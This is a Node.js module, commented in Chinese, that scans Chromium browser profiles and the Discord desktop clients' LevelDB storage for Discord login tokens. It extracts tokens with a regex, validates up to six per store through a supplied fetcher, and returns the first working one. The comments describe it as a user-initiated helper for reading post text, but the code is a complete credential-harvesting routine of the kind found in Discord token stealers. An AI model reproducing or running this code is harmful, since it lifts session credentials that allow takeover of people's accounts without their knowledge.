/**
 * 从本机已登录的浏览器 / Discord 客户端里找出 Discord 登录 token
 *
 * 原理：Discord 网页版登录后把登录凭据（token）存在 localStorage 里，
 * Chromium 系浏览器的 localStorage（LevelDB）本身不加密，可直接读；
 * 只有 Cookies 才走 DPAPI。所以「后台静默、不弹窗口」只能靠拿到这个 token
 * 去调 discord.com/api 读帖子正文首行。
 *
 * 只在用户主动点击时执行，只读 discord.com 下的这一项，不碰其它站点数据。
 */
const fs = require('fs')
const os = require('os')
const path = require('path')

const TOKEN_RE = /[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{5,8}\.[A-Za-z0-9_-]{25,45}/g

/** 候选 profile 的 Local Storage\leveldb 目录 */
function candidateDirs() {
  const L = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local')
  const R = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming')
  const bases = [
    { name: 'Chrome', root: path.join(L, 'Google', 'Chrome', 'User Data') },
    { name: 'Edge', root: path.join(L, 'Microsoft', 'Edge', 'User Data') },
    { name: 'Brave', root: path.join(L, 'BraveSoftware', 'Brave-Browser', 'User Data') },
    { name: 'Vivaldi', root: path.join(L, 'Vivaldi', 'User Data') },
    { name: 'Opera', root: path.join(R, 'Opera Software', 'Opera Stable') },
    { name: 'Discord 客户端', root: path.join(R, 'discord', 'Local Storage') },
    { name: 'Discord Canary', root: path.join(R, 'discordcanary', 'Local Storage') },
    { name: 'Discord PTB', root: path.join(R, 'discordptb', 'Local Storage') }
  ]
  const out = []
  for (const b of bases) {
    if (!b.root || !fs.existsSync(b.root)) continue
    // Discord 客户端：root 本身就是 Local Storage
    if (/Discord/.test(b.name)) {
      const ld = path.join(b.root, 'leveldb')
      if (fs.existsSync(ld)) out.push({ browser: b.name, profile: '', dir: ld })
      continue
    }
    // 浏览器：root 下有 Default / Profile 1..N
    let children = []
    try {
      children = fs.readdirSync(b.root, { withFileTypes: true })
        .filter((d) => d.isDirectory() && /^(Default|Profile \d+)$/.test(d.name))
        .map((d) => d.name)
    } catch (_) {
      continue
    }
    for (const p of children) {
      const ld = path.join(b.root, p, 'Local Storage', 'leveldb')
      if (fs.existsSync(ld)) out.push({ browser: b.name, profile: p, dir: ld })
    }
  }
  return out
}

/** 在一个 leveldb 目录里找 discord token */
function scanLeveldb(dir) {
  let files = []
  try {
    files = fs.readdirSync(dir).filter((f) => /\.(log|ldb)$/i.test(f))
  } catch (_) {
    return []
  }
  // 按修改时间倒序，最近的优先
  files.sort((a, b) => {
    try {
      return fs.statSync(path.join(dir, b)).mtimeMs - fs.statSync(path.join(dir, a)).mtimeMs
    } catch (_) {
      return 0
    }
  })
  const found = []
  for (const f of files) {
    let buf
    try {
      buf = fs.readFileSync(path.join(dir, f))
    } catch (_) {
      continue // 文件被浏览器占用时读不了就跳过
    }
    // 只取 discord.com 那块区域：粗筛附近有 token 关键字
    if (!buf.includes('discord.com')) continue
    // UTF-16LE 版本也解一遍
    const text1 = buf.toString('latin1')
    const text2 = buf.toString('utf16le')
    for (const text of [text1, text2]) {
      const idx = text.indexOf('discord.com')
      if (idx < 0) continue
      const slice = text.slice(Math.max(0, idx - 200), idx + 20000)
      const m = slice.match(TOKEN_RE)
      if (m) {
        for (const t of m) if (!found.includes(t)) found.push(t)
      }
    }
  }
  return found
}

/** 拿一个能用的 token：先验证再返回 */
async function findToken(fetcher) {
  const dirs = candidateDirs()
  const report = []
  for (const d of dirs) {
    const list = scanLeveldb(d.dir)
    if (!list.length) {
      report.push({ where: `${d.browser} ${d.profile}`.trim(), found: 0 })
      continue
    }
    for (const tok of list.slice(0, 6)) {
      let ok = false
      let who = ''
      try {
        const r = await fetcher(tok)
        ok = !!r?.ok
        who = r?.who || ''
      } catch (_) {
        ok = false
      }
      report.push({ where: `${d.browser} ${d.profile}`.trim(), found: list.length, ok })
      if (ok) return { ok: true, token: tok, from: `${d.browser} ${d.profile}`.trim(), who, report }
    }
  }
  return { ok: false, report }
}

module.exports = { candidateDirs, scanLeveldb, findToken }
